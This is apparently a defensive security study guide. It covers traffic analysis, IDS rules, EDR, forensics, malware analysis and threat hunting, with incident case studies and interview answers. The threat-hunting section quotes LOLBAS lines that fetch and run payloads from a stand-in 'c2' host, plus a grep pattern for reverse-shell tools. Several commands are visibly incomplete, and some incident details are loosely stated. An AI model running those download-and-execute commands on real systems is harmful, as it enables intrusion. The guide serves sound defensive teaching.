Network Traffic Analysis — Wireshark
Lazarus Group / Bangladesh Bank Heist
// core concepts
Wireshark Display Filters
`http.request`, `dns.qry.name`, `tcp.stream eq 0` — filter expressions isolate specific traffic types from noise.
Follow TCP Stream
Right-click a TCP packet → Follow → TCP Stream. Reconstructs the entire conversation — HTTP requests, FTP commands, plaintext protocols.
TLS Handshake Inspection
`tls.handshake.type` shows ClientHello, ServerHello, Certificate exchange. Cipher suite negotiation is visible packet by packet.
Export Objects
File → Export Objects → HTTP/SMB. Extract files transferred over the wire without manual reassembly.
// the real incident

Bangladesh Bank Heist (2016): Lazarus Group (DPRK) infiltrated Bangladesh Bank's SWIFT network and sent fraudulent transfer requests totaling $951M. Forensic analysts used Wireshark to dissect captured SWIFT message traffic, reconstructing the exact sequence of fraudulent messages and identifying the command-and-control IPs used for the transfers. $101M was stolen before the remaining requests were blocked by a typo in a beneficiary name.

// commands
tshark -r capture.pcap -Y "http.request"
Filter and display all HTTP request packets from a saved capture file.
tshark -r capture.pcap -Y "tcp.port==443" -T fields -e ip.src -e ip.dst -e tls.handshake.ciphersuite
Extract TLS handshake details — source, destination, negotiated cipher suite.
wireshark capture.pcap
Open PCAP in GUI for interactive analysis with display filters, streams, and exports.
tcpdump -i eth0 -w live.pcap
Capture live traffic to a file for later analysis in Wireshark.
// interview answer
Q: How would you identify a suspicious DNS query in Wireshark?
Apply filter `dns.qry.name` and sort by length. DGA-based malware generates long, random-looking subdomains (e.g., `asdfghjkl1234.malware.com`). Legitimate queries are short and readable. Export the DNS query names and check against threat intel feeds.

Intrusion Detection — Snort / Suricata
Snort — Top IDS Deployments Worldwide
// core concepts
IDS vs IPS
IDS alerts only (passive). IPS sits inline and blocks traffic matching rules. Same rules engine, different action.
Snort Rule Anatomy
`alert tcp any any -> $HOME_NET 445 (msg:"EternalBlue"; content:"|00 00 00 31 ff|"; sid:1000001;)` — action, protocol, source, destination, rule body.
Rule Actions
`alert` logs and alerts. `drop` blocks and logs (IPS mode). `reject` blocks and sends TCP RST. `pass` ignores matching traffic.
PCAP Replay Testing
Run Snort or Suricata against known malicious PCAPs to validate rules before deploying to production.
// key statistics

Snort remains the #1 deployed open-source IDS globally with 5M+ downloads and 40,000+ detection rules. Suricata adds GPU acceleration and native HTTP/2 parsing. Both use the same rule format but Suricata can handle 10Gbps+ line rates with proper tuning.

// commands
snort -c /etc/snort/snort.conf -i eth0
Start Snort IDS on interface eth0 with specified config file.
snort -r capture.pcap -c snort.conf -A fast
Run Snort against a saved PCAP file — test rules offline.
suricata -c /etc/suricata/suricata.yaml -i eth0
Start Suricata IPS/IDS with YAML configuration.
suricata -r capture.pcap -l /var/log/suricata/
Analyze PCAP with Suricata, write alerts to log directory.
tail -f /var/log/suricata/fast.log
Monitor real-time Suricata alerts as they fire.
// interview answer
Q: Write a Snort rule that alerts when a internal host connects to a known malware C2 on TCP port 8443.
`alert tcp $HOME_NET any -> 192.168.1.100 8443 (msg:"Malware C2 beacon detected"; content:"|00 01 02|"; classtype:trojan-activity; sid:1000002; rev:1;)` — source is internal, destination is the C2 IP and port, content match checks for known beacon pattern.

Endpoint Detection & Response (EDR) Basics
CrowdStrike Falcon — Hafnium Response 2021
// core concepts
AV vs EDR
AV checks file hashes against known signatures. EDR watches behavior — process creation, registry changes, network connections, memory access patterns.
Fileless Malware Detection
Malware that runs entirely in memory (PowerShell, WMI, .NET reflection) has no file to scan. EDR catches it by monitoring for unusual PowerShell spawning from Office or suspicious WMI event subscriptions.
LSASS Protection
Windows LSASS.exe holds all logged-on user credentials. EDR detects PPL bypass attempts and suspicious OpenProcess calls targeting LSASS.
Process Injection Telemetry
EDR flags CreateRemoteThread, WriteProcessMemory, SetWindowsHookEx — common injection APIs. Legitimate software rarely calls these.
// the real incident

Hafnium Attacks (2021): Chinese state-sponsored group exploited four zero-days in Microsoft Exchange (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065). CrowdStrike Falcon EDR detected anomalous w3wp.exe (Exchange worker process) behavior within minutes — webshell deployment, unusual PowerShell execution, and suspicious outbound connections. EDR telemetry enabled global containment within hours.

// commands
Get-Process -Name w3wp | Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-IIS-Logging/Operational'}
Check IIS worker process for suspicious activity — Hafnium left webshell traces here.
wevtutil qe Security /q:"*[System[EventID=4688]]" /c:50 /f:text
Query Windows Event Log for process creation events — detect anomalous process chains.
// interview answer
Q: How does EDR detect a fileless attack that never touches disk?
EDR monitors API calls in real time. If a Word macro invokes PowerShell to call Win32 API via .NET reflection without dropping a file, EDR sees the process tree: WINWORD.EXE → powershell.exe → cscript.exe. That chain is itself the alert — no file hash needed. Event ID 4688 (process creation) with suspicious parent-child relationships is the key telemetry.

Threat Intelligence Basics
MISP — Kaseya Supply-Chain Response 2021
// core concepts
STIX & TAXII
STIX (Structured Threat Information Expression) is the JSON format for IoCs. TAXII is the transport protocol to share them. MISP supports both.
IoC Tiers
Level 1: Hash (easy to change). Level 2: IP/Domain (moderate). Level 3: Behavioral/yara rule (hard to evade). Level 4: TTP (hardest — attacker must change how they operate).
MISP Platform
Open-source threat intelligence sharing platform. Create events, add attributes (IPs, hashes, domains), set TLP (Traffic Light Protocol) for sharing restrictions.
CTI Lifecycle
Direction (what to collect) → Collection → Processing → Analysis → Dissemination → Feedback. Intelligence that isn't acted on has no value.
// the real incident

Kaseya Supply-Chain Ransomware (July 2021): REvil ransomware pushed through Kaseya's VSA remote management software to 1,500+ downstream organizations. MISP enabled real-time IoC sharing across 1,000+ organizations within hours of Discovery. The first STIX feed containing C2 IPs, YARA rules, and file hashes was published before many victims even knew they were compromised. This is intelligence operationalization at scale.

// commands
curl -H "Authorization: " -X POST https://misp.local/events -d @event.json
Push a new threat intelligence event to MISP via REST API.
stix2-validator report.json
Validate a STIX 2.1 report before publishing — catches schema errors.

MITRE ATT&CK Framework
Mandiant / SolarWinds APT29 Attribution
// core concepts
ATT&CK Matrix Structure
14 tactic columns (Initial Access → Exfiltration) × technique rows per tactic. Each technique has an ID: T1078 (Valid Accounts), T1133 (External Remote Services).
Tactics vs Techniques
Tactic = the WHY (what the attacker is trying to achieve). Technique = the HOW (specific method used). Same technique can serve multiple tactics.
Sub-Techniques
Refinements: T1059.001 = PowerShell, T1059.003 = Windows Command Shell, T1059.005 = Visual Basic. Enables precise detection rules.
ATT&CK Navigator
Web-based tool to layer techniques. Red = detected, Orange = partial, Grey = undetected. Instant visual gap analysis.
// the real incident

SolarWinds / APT29 (2020): Mandiant mapped 15+ MITRE ATT&CK techniques across the full kill chain: T1195 (Supply Chain Compromise) for the initial SolarWinds Orion compromise, T1078 (Valid Accounts) for credential abuse, T1133 (External Remote Services) for VPN persistence, T1553 (Subvert Trust Controls) for code signing, and T1564 (Hide Artifacts) for log deletion. This technique pattern uniquely identified APT29 (Cozy Bear) as the actor.

// commands
cat attack_chain.json | jq '.techniques[] | "\(.id) - \(.name)"'
Extract technique IDs and names from a mapped attack chain JSON for documentation.
python3 attack-navigator.py --input coverage.json --output heatmap.html
Generate ATT&CK Navigator layer from detection coverage data — visual gap analysis.
// interview answer
Q: How would you use MITRE ATT&CK to identify gaps in a SOC's detection coverage?
Map every current detection rule or alert to its corresponding ATT&CK technique. Load into Navigator: every uncolored cell is a gap. Prioritize coverage for techniques most commonly used against your industry. For example, if you have no detection for T1059.001 (PowerShell), attackers can run fileless malware undetected. The matrix tells you exactly what you're missing.

Incident Response Lifecycle
NIST IR Framework — Colonial Pipeline 2021
// NIST SP 800-61 phases
1. Preparation
Build IR plan, assemble team, pre-deploy logging and EDR. Most critical phase — 80% of response success depends on preparation done before the incident.
2. Detection & Analysis
Alert triggers → triage → scope determination. Is this a real incident or a false positive? What systems are affected?
3. Containment
Stop the bleeding. Isolate affected hosts, disable compromised accounts, block C2 IPs at firewall. Short-term vs long-term containment.
4. Eradication
Remove the root cause. Patch vulnerabilities, delete malware, revoke certificates, rebuild compromised systems from clean media.
5. Recovery
Restore from clean backups, bring services online, monitor for re-infection. Phased rollout preferred over full blast.
6. Lessons Learned
Post-mortem report within 1-2 weeks. What went well? What failed? Update IR plan and controls. Without this phase, you repeat the same mistakes.
// the real incident

Colonial Pipeline (May 2021): DarkSide ransomware breached Colonial's IT network via a compromised VPN password. The IR team followed the NIST lifecycle: isolated OT systems from IT (containment), refused to restore from backup until eradication was confirmed, rebuilt systems from clean media (eradication/recovery), and implemented MFA across all remote access within 2 weeks post-incident (lessons learned). The $4.4M ransom was paid, but the NIST framework saved the pipeline itself.

// commands
iptables -A INPUT -s -j DROP
Immediate firewall containment — drop all traffic from known attacker IP.
psexec \\\\target -s cmd /c "net stop "
Remote service termination during eradication phase.
// interview answer
Q: Walk me through what you do in the first 15 minutes of a confirmed ransomware incident.
A: Minute 1-3: Confirm the alert is not a false positive (check EDR console). Minute 3-5: Identify affected systems by checking detection scope. Minute 5-10: Isolate affected hosts by disconnecting network cables or disabling switch ports. Minute 10-12: Disable compromised user accounts in Active Directory. Minute 12-15: Escalate to IR lead and document everything. Containment is always the first priority.

Digital Forensics Basics
Sony Pictures Breach 2014
// core concepts
Forensic Imaging (dd)
`dd if=/dev/sda of=image.dd bs=4M` creates a bit-for-bit copy. Write-blocker prevents accidental modification during acquisition.
File Carving (foremost/scalpel)
Recovers deleted files by scanning raw disk data for file headers (JFIF, PNG, PDF). Works even after files are "deleted" from filesystem.
Timeline Analysis
Correlate MAC times (Modified, Accessed, Created) from filesystem metadata with log entries. Build a sequence of attacker actions in chronological order.
Chain of Custody
Every forensic acquisition must be documented: who, what, when, where, how. SHA-256 hashes verify image integrity. Without chain of custody, evidence is inadmissible.
// the real incident

Sony Pictures (November 2014): Attackers (attributed to DPRK's Lazarus Group) had access to Sony's network for over a month. Digital forensics revealed the full timeline: initial compromise via spear-phishing in September, lateral movement to administrative systems, exfiltration of 100TB+ of data through encrypted channels, and deployment of wiper malware that destroyed 3,000+ workstations and 500+ servers. Forensic analysis of the wiper binary's compile timestamps and debug paths tied it to previous DPRK malware samples.

// commands
dd if=/dev/sda of=/evidence/image.dd bs=4096 conv=noerror,sync
Create forensic disk image with error handling — skip bad blocks but maintain offset alignment.
sha256sum image.dd > evidence.hash
Compute and store hash for chain of custody verification.
foremost -i image.dd -o /evidence/carved
Carve deleted files from disk image using file header signatures.
fls -m / -r image.dd > bodyfile.txt && mactime -b bodyfile.txt > timeline.csv
Build filesystem timeline from Sleuth Kit — MAC times for every file, sorted chronologically.
// interview answer
Q: What is the difference between live forensics and dead forensics?
Live forensics captures volatile data (RAM, network connections, running processes) from a powered-on system — the attacker might still be active. Dead forensics analyzes a powered-off disk image — the system is preserved but volatile evidence is lost. Always acquire RAM before powering down. The order of volatility: CPU cache → RAM → network connections → disk processes → disk.

Malware Analysis — Static Basics
Stuxnet — Static Analysis Discovery
// core concepts
PE Header Analysis
Portable Executable format. Check DOS header, NT header, section table (.text, .data, .rdata, .rsrc). Suspicious sections are often named differently or have unusual entropy.
Import Address Table (IAT)
Lists every external DLL function a binary calls. `CreateRemoteThread` + `WriteProcessMemory` + `VirtualAllocEx` = process injection. `InternetOpenUrl` + `URLDownloadToFile` = downloader.
String Analysis
`strings sample.exe` extracts embedded text: IP addresses, registry keys, mutex names, command-line arguments. Attacker mistakes in strings have identified APT groups.
Compile Timestamps
PE header contains the compilation timestamp. Can be faked, but many malware samples don't bother. Correlating timestamps across samples helps attribute campaigns.
// the real incident

Stuxnet Static Analysis (2010): Researchers at Kaspersky and Symantec performed static analysis that identified Stuxnet as a state-built cyberweapon. Key findings: two stolen digital certificates from RealTek and JMicron (legitimate companies), four zero-day exploits (including CVE-2010-2568 LNK vulnerability), Siemens WinCC Step-7 SCADA software targeting, and strings referencing Iranian nuclear facilities. Static analysis alone revealed the weapon's purpose without ever executing it.

// commands
file sample.exe
Identify file type — confirms it's a PE32 executable for Windows.
sha256sum sample.exe
Compute hash — check against VirusTotal and threat intel databases.
strings sample.exe | sort -u | head -100
Extract unique strings — URLs, IPs, registry keys, error messages.
objdump -p sample.exe | grep -i "TimeDateStamp"
Extract compile timestamp from PE header for sample correlation.
pe-checksec sample.exe
Check binary security features — ASLR, DEP, SafeSEH, Control Flow Guard.
// interview answer
Q: What static indicators would make you suspect a binary is malicious?
High entropy in non-packed sections (suggests encrypted/compressed payload), imports of both socket functions AND process injection functions, suspicious section names like `.upx0`, a compile timestamp that doesn't match the claimed version date, and strings containing C2 IPs, PowerShell commands, or registry persistence keys. Any one is suspicious; three or more is highly indicative.

Malware Analysis — Dynamic/Sandbox Basics
Dridex Banking Trojan — Cuckoo Sandbox
// core concepts
Sandbox Execution
Run malware in an isolated VM. Cuckoo and ANY.RUN capture every API call, file write, registry change, and network connection made during execution.
API Monitoring
Every call to NtCreateFile, RegSetValue, InternetOpenUrl is logged. A single execution reveals C2 domains, persistence locations, and credential theft attempts.
Network Behavior
DNS queries, HTTP/HTTPS POST requests (exfiltrated data), and beacon intervals are captured. Dridex checked in every 60 seconds — regular beaconing is a strong IoC.
Evasion Detection
Malware checks for sandbox artifacts: is the screen resolution 800x600? Are there VMware tools installed? Does the username match "Cuckoo"? Evasion itself is an indicator.
// the real incident

Dridex Banking Trojan (2014–2023): European banking security teams used Cuckoo sandbox to analyze thousands of Dridex samples. Dynamic analysis revealed: C2 infrastructure across 300+ financial institution compromises, credential harvesting via web injects (fake banking pages injected into legitimate browser sessions), and a distributed botnet architecture that evolved over 9 years. Every C2 domain, every injected banking page, and every exfiltration endpoint was first identified through sandbox execution.

// commands
python3 cuckoo.py submit --timeout 120 suspicious.exe
Submit sample to Cuckoo sandbox with 2-minute execution timeout.
inotifywait -m -r /tmp/
Monitor real-time file system changes in /tmp during malware execution.
tcpdump -i eth0 -n -X port 80 or port 443
Capture live network traffic from sandboxed VM — see C2 communication in real time.
regshot take && && regshot compare
Take registry snapshot before and after execution — identify persistence keys added by malware.
watch -n 1 "lsof -p $(pgrep malware_pid)"
Monitor file descriptors opened by malware process in real time.
// interview answer
Q: How can malware detect it's running in a sandbox and what do you do about it?
Malware checks screen resolution (800x600 is common in VMs), MAC prefix (00:0C:29 = VMware), registry keys for VMware Tools, or sleeps for 10+ minutes before executing. Counter: use custom sandbox with real hardware MACs, real display drivers, and patch out sleep calls with API hooking. Also check the sample's anti-VM logic in static analysis — it tells you what to fake.

Threat Hunting Fundamentals
LOLBAS — Living Off the Land
// core concepts
Hypothesis-Driven Hunting
Start with a hypothesis: "Attackers are using PowerShell to download payloads." Then search logs, network traffic, and process data for evidence. Not random searching.
Pyramid of Pain
Hash values (easy to change) → IPs → Domain Names → Network Artifacts → Tools → TTPs (hardest). Hunting at the TTP level finds attackers even after they change infrastructure.
Living Off the Land (LotL)
Attackers use built-in OS tools (powershell.exe, wmic.exe, certutil.exe, cscript.exe) instead of dropping custom binaries. No file to detect — the tool IS the payload.
Proactive vs Reactive
Reactive = waiting for alerts to fire. Proactive = searching for attacker activity in absence of alerts. Most SOCs are entirely reactive; threat hunting is the differentiator.
// the real incident

LOLBAS Project: The Living Off the Land Binaries, Scripts and Libraries (LOLBAS) project catalogs every Microsoft-signed binary that can be abused for malicious purposes. Examples: `certutil.exe -urlcache -f http://c2/payload.exe payload.exe` (downloads files), `wmic.exe process call create "calc.exe"` (executes code), `regsvr32.exe /s /u /i:http://c2/payload.sct scrobj.dll` (code execution via scriptlet). These are trusted, signed Microsoft tools — traditional AV whitelists them. Threat hunters specifically monitor for abnormal usage patterns of these binaries.

// commands
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | Where-Object {$_.Properties[5].Value -match 'certutil|wmic|regsvr32'}
Hunt for LotL abuse — process creation events for known LOLBAS binaries.
wevtutil qe Security /q:"*[System[EventID=4688]]" /f:text | findstr /i "certutil"
Query Windows Event Log for certutil.exe execution — legitimate usage is rare, abuse is common.
cat /var/log/syslog | grep -E "curl|wget|python|bash -i"
Hunt for reverse shell and download patterns in Linux logs.
// interview answer
Q: How do you distinguish legitimate PowerShell usage from attacker misuse?
Three key indicators: (1) Source — PowerShell spawned from Office, browser, or random process vs. from legitimate admin tools. (2) Arguments — base64-encoded commands (-EncodedCommand), download strings, obfuscated script blocks. (3) Frequency — an admin runs 5 PowerShell commands per day; a compromised machine runs 500. Enable PowerShell Script Block Logging (Event ID 4104) to see every deobfuscated command.

// Quick Self-Quiz — Can You Answer These Without Looking?

Cover the answers. Say them out loud. If you can't answer one fluently, revisit that day before continuing.

Q01
How did forensic analysts trace the Bangladesh Bank heist using Wireshark?
They dissected captured SWIFT message traffic by following TCP streams and filtering for SWIFT protocol patterns, reconstructing the exact sequence of fraudulent $951M transfer requests and identifying Lazarus Group C2 IPs.
Q02
Write a basic Snort rule structure. What does each part mean?
`alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"Example"; content:"malicious"; sid:1000001; rev:1;)` — action, protocol, source (IP+port), direction, destination (IP+port), rule body with message, content match, and unique signature ID.
Q03
How did CrowdStrike Falcon EDR detect the Hafnium Exchange attack so quickly?
Falcon detected anomalous w3wp.exe (Exchange worker process) behavior — webshell deployment via unusual child processes (PowerShell, cmd.exe), suspicious outbound connections from the Exchange server, and file writes to the inetpub/wwwroot directory.
Q04
What is the difference between STIX and TAXII?
STIX is the data format (JSON schema for threats, IoCs, TTPs). TAXII is the transport protocol for sharing STIX data between organizations. STIX = what you share. TAXII = how you share it.
Q05
How many MITRE ATT&CK techniques were mapped in the SolarWinds attack chain? Name three.
15+ techniques. Examples: T1195 (Supply Chain Compromise) — infected Orion build. T1078 (Valid Accounts) — abused existing credentials. T1553 (Subvert Trust Controls) — forged code signing certificates.
Q06
Walk through the NIST IR lifecycle. Which phase is most critical and why?
Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned. Preparation is most critical because 80% of response success depends on pre-deployed logging, EDR coverage, and playbooks created before any incident occurs.
Q07
What command creates a forensic disk image, and why is the hash important?
`dd if=/dev/sda of=image.dd bs=4096 conv=noerror,sync`. The SHA-256 hash verifies the image is identical to the original at acquisition time. Without a verifiable hash, the evidence cannot be admitted in court — the chain of custody is broken.
Q08
What static indicators identified Stuxnet as a state-built cyberweapon?
Two stolen but legitimate digital certificates (RealTek, JMicron), four zero-day exploits, Siemens WinCC Step-7 SCADA-specific code, and strings referencing Iranian nuclear facilities. No commodity malware has that combination.
Q09
How can malware detect it's running in a sandbox, and what's the countermeasure?
Checks: screen resolution (800x600), VMware MAC prefix (00:0C:29), registry keys for VMware Tools, long sleep calls (10+ min). Counter: use bare-metal sandboxes, patch sleep calls via API hooking, customize VM artifacts to match real enterprise configurations.
Q10
What is the Pyramid of Pain and how does it relate to threat hunting?
Hash → IP → Domain → Network Artifact → Tools → TTPs. Lower levels are easy for attackers to change (hashes in minutes). Higher levels (TTPs) are very difficult to change. Threat hunters aim to detect TTPs so attackers cannot evade by simply replacing infrastructure.
